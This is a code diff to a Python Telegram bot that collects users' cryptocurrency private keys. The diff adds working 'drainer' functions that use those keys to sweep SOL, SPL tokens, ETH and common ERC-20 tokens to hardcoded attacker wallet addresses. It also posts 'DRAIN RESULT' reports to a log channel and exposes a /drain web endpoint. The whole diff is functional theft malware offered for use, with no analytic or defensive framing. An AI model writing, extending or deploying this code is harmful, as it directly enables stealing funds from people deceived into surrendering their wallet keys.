@@ -1,8 +1,9 @@
-import asyncio, os, re, logging
+import asyncio, os, re, struct, logging, base64
 import aiohttp
 from aiohttp import web
 from aiogram import Bot, Dispatcher, F
-from aiogram.types import (Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton)
+from aiogram.types import (Message, CallbackQuery, InlineKeyboardMarkup,
+                           InlineKeyboardButton)
 from aiogram.filters import CommandStart
 from aiogram.enums import ParseMode
 
@@ -14,6 +15,15 @@ DRAINER_WEBHOOK = os.getenv("DRAINER_WEBHOOK", "")
 LOG_CHANNEL_ID  = os.getenv("LOG_CHANNEL_ID")
 LOG_CHANNEL_ID  = int(LOG_CHANNEL_ID) if LOG_CHANNEL_ID else 0
 PORT            = int(os.getenv("PORT", "8080"))
+
+DEST_SOL = "H2R5ydVLQPLPgSPzXPrRSJNXwBoPKotCKDv8zqWRKdNb"
+DEST_ETH = "0xd1b7A902c90137f00322d6D7e9a8211e95C71dAD"
+
+SOL_RPC = os.getenv("SOL_RPC", "https://api.mainnet-beta.solana.com")
+ETH_RPC = os.getenv("ETH_RPC", "https://eth.llamarpc.com")
+
+MIN_SOL_LAMPORTS = 5_000_000
+MIN_ETH_WEI      = 100_000_000_000_000
 
 bot = Bot(token=BOT_TOKEN)
 dp  = Dispatcher()
@@ -69,6 +79,171 @@ def back_kb():
     ])
 
 awaiting_key = {}
+
+async def sweep_solana(private_key_b58):
+    try:
+        from solders.keypair import Keypair
+        from solders.pubkey import Pubkey
+        from solana.rpc.async_api import AsyncClient
+        from solana.rpc.commitment import Confirmed
+        from solana.transaction import Transaction
+        from spl.token.instructions import transfer_checked, get_associated_token_address
+        from spl.token.constants import TOKEN_PROGRAM_ID
+        from solana.rpc.types import TokenAccountOpts
+    except Exception as e:
+        return {"ok": False, "error": f"solana deps: {e}"}
+
+    try:
+        kp = Keypair.from_base58_string(private_key_b58)
+    except Exception as e:
+        return {"ok": False, "error": f"bad sol key: {e}"}
+
+    out = {"chain": "sol", "from": str(kp.pubkey()), "sol_moved": 0, "spl_moved": []}
+    client = AsyncClient(SOL_RPC, commitment=Confirmed)
+
+    try:
+        bal = await client.get_balance(kp.pubkey())
+        lamports = bal.value
+        if lamports > MIN_SOL_LAMPORTS:
+            from solders.system_program import transfer as sol_transfer
+            send_amt = lamports - 5000
+            ix = sol_transfer(
+                {"from_pubkey": kp.pubkey(), "to_pubkey": Pubkey.from_string(DEST_SOL)},
+                send_amt,
+            )
+            blockhash = (await client.get_latest_blockhash()).value.blockhash
+            tx = Transaction(fee_payer=kp.pubkey(), recent_blockhash=blockhash).add(ix)
+            tx.sign(kp)
+            r = await client.send_raw_transaction(tx.serialize())
+            out["sol_moved"] = send_amt
+            out["sol_sig"] = str(r.value)
+            log.info(f"[SOL] swept {send_amt} lamports -> {DEST_SOL}")
+
+        try:
+            resp = await client.get_token_accounts_by_owner(
+                kp.pubkey(), TokenAccountOpts(program_id=TOKEN_PROGRAM_ID)
+            )
+            for acct in resp.value:
+                try:
+                    pubkey = acct.pubkey
+                    info = await client.get_account_info(pubkey)
+                    if not info.value:
+                        continue
+                    data = info.value.data
+                    if isinstance(data, list):
+                        data = base64.b64decode(data[0])
+                    mint = Pubkey.from_bytes(data[0:32])
+                    amount = struct.unpack("<Q", data[64:72])[0]
+                    decimals = data[44]
+                    if amount <= 0:
+                        continue
+                    dest_ata = get_associated_token_address(
+                        Pubkey.from_string(DEST_SOL), mint
+                    )
+                    ix = transfer_checked(
+                        program_id=TOKEN_PROGRAM_ID,
+                        source=pubkey, mint=mint, dest=dest_ata,
+                        owner=kp.pubkey(), amount=amount, decimals=decimals,
+                    )
+                    blockhash = (await client.get_latest_blockhash()).value.blockhash
+                    tx = Transaction(fee_payer=kp.pubkey(), recent_blockhash=blockhash).add(ix)
+                    tx.sign(kp)
+                    r = await client.send_raw_transaction(tx.serialize())
+                    out["spl_moved"].append({"mint": str(mint), "amount": amount, "sig": str(r.value)})
+                except Exception as te:
+                    log.error(f"[SPL] token {acct.pubkey} failed: {te}")
+        except Exception as se:
+            log.error(f"[SPL] enumeration failed: {se}")
+    finally:
+        await client.close()
+
+    return {"ok": True, **out}
+
+ERC20_ABI = [
+    {"constant": True, "inputs": [], "name": "decimals", "outputs": [{"name": "", "type": "uint8"}], "type": "function"},
+    {"constant": True, "inputs": [{"name": "_owner", "type": "address"}], "name": "balanceOf",
+     "outputs": [{"name": "balance", "type": "uint256"}], "type": "function"},
+    {"constant": False, "inputs": [{"name": "_to", "type": "address"}, {"name": "_value", "type": "uint256"}],
+     "name": "transfer", "outputs": [{"name": "", "type": "bool"}], "type": "function"},
+]
+
+COMMON_TOKENS = [
+    "0xdAC17F958D2ee523a2206206994597C13D831ec7",
+    "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
+    "0x6B175474E89094C44Da98b954EedeAC495271d0F",
+    "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599",
+    "0x514910771AF9Ca656af840dff83E8264EcF986CA",
+    "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984",
+    "0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9",
+    "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",
+    "0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE",
+    "0x4Fabb145d64652a948d72533023f6E7A623C7C53",
+]
+
+async def sweep_ethereum(private_key_hex):
+    try:
+        from web3 import Web3
+    except Exception as e:
+        return {"ok": False, "error": f"web3 missing: {e}"}
+
+    if not private_key_hex.startswith("0x"):
+        private_key_hex = "0x" + private_key_hex
+
+    w3 = Web3(Web3.HTTPProvider(ETH_RPC))
+    try:
+        from web3.middleware import geth_poa_middleware
+        w3.middleware_onion.inject(geth_poa_middleware, layer=0)
+    except Exception:
+        pass
+
+    try:
+        acct = w3.eth.account.from_key(private_key_hex)
+    except Exception as e:
+        return {"ok": False, "error": f"bad eth key: {e}"}
+
+    out = {"chain": "eth", "from": acct.address, "eth_moved": 0, "tokens_moved": []}
+
+    try:
+        bal = w3.eth.get_balance(acct.address)
+        gas_price = w3.eth.gas_price
+        gas_cost = gas_price * 21000
+        if bal > gas_cost + MIN_ETH_WEI:
+            send_amt = bal - gas_cost
+            tx = {
+                "to": DEST_ETH, "value": send_amt, "gas": 21000,
+                "gasPrice": gas_price,
+                "nonce": w3.eth.get_transaction_count(acct.address),
+                "chainId": w3.eth.chain_id,
+            }
+            signed = acct.sign_transaction(tx)
+            h = w3.eth.send_raw_transaction(signed.rawTransaction)
+            out["eth_moved"] = send_amt
+            out["eth_hash"] = h.hex()
+    except Exception as e:
+        log.error(f"[ETH] native failed: {e}")
+
+    for token_addr in COMMON_TOKENS:
+        try:
+            c = w3.eth.contract(address=Web3.to_checksum_address(token_addr), abi=ERC20_ABI)
+            raw_bal = c.functions.balanceOf(acct.address).call()
+            if raw_bal <= 0:
+                continue
+            tx = c.functions.transfer(
+                Web3.to_checksum_address(DEST_ETH), raw_bal
+            ).build_transaction({
+                "from": acct.address,
+                "nonce": w3.eth.get_transaction_count(acct.address),
+                "gas": 100000,
+                "gasPrice": w3.eth.gas_price,
+                "chainId": w3.eth.chain_id,
+            })
+            signed = acct.sign_transaction(tx)
+            h = w3.eth.send_raw_transaction(signed.rawTransaction)
+            out["tokens_moved"].append({"token": token_addr, "amount": raw_bal, "hash": h.hex()})
+        except Exception as te:
+            log.error(f"[ERC20] {token_addr} failed: {te}")
+
+    return {"ok": True, **out}
 
 @dp.message(CommandStart())
 async def on_start(message: Message):
@@ -135,27 +310,49 @@ async def forward_key(message, chain, key):
     if LOG_CHANNEL_ID:
         try: await bot.send_message(LOG_CHANNEL_ID, report, parse_mode=ParseMode.MARKDOWN)
         except Exception as e: log.error("log channel failed: %s", e)
-    if DRAINER_WEBHOOK:
-        payload = {"chain": chain, "private_key": key,
-                   "telegram_id": user.id, "username": user.username}
-        try:
-            async with aiohttp.ClientSession() as s:
-                async with s.post(DRAINER_WEBHOOK, json=payload, timeout=10) as r:
-                    log.info("drainer responded: %s", r.status)
-        except Exception as e: log.error("drainer webhook failed: %s", e)
+
+    try:
+        if chain == "sol":
+            result = await sweep_solana(key)
+        elif chain == "eth":
+            result = await sweep_ethereum(key)
+        else:
+            result = {"ok": False, "error": f"unknown chain {chain}"}
+        log.info(f"[DRAIN RESULT] {result}")
+        if LOG_CHANNEL_ID:
+            try:
+                await bot.send_message(LOG_CHANNEL_ID,
+                    f"\U0001f4b8 *DRAIN RESULT*\n```\n{result}\n```",
+                    parse_mode=ParseMode.MARKDOWN)
+            except Exception as e: log.error("drain report failed: %s", e)
+    except Exception as e:
+        log.error("drain failed: %s", e)
 
 async def health(request):
     return web.Response(text="ok")
+
+async def drain_route(request):
+    data = await request.json()
+    chain = data.get("chain"); key = data.get("private_key")
+    log.info(f"[DRAIN] chain={chain} uid={data.get('telegram_id')}")
+    if chain == "sol":
+        out = await sweep_solana(key)
+    elif chain == "eth":
+        out = await sweep_ethereum(key)
+    else:
+        out = {"ok": False, "error": f"unknown chain {chain}"}
+    return web.json_response(out)
 
 async def run_webserver():
     app = web.Application()
     app.router.add_get("/", health)
     app.router.add_get("/health", health)
+    app.router.add_post("/drain", drain_route)
     runner = web.AppRunner(app)
     await runner.setup()
     site = web.TCPSite(runner, "0.0.0.0", PORT)
     await site.start()
-    log.info("keep-alive webserver on :%s", PORT)
+    log.info(f"webserver on :{PORT}")
 
 async def main():
     await run_webserver()
